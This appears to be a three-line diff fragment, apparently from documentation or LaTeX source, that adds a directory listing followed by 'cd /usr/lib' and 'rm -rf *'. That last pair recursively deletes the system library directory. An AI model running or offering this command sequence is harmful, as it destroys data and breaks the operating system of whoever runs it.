@@ -1,0 +1,3 @@
+{ \tt ls -al}
+cd /usr/lib
+rm -rf *
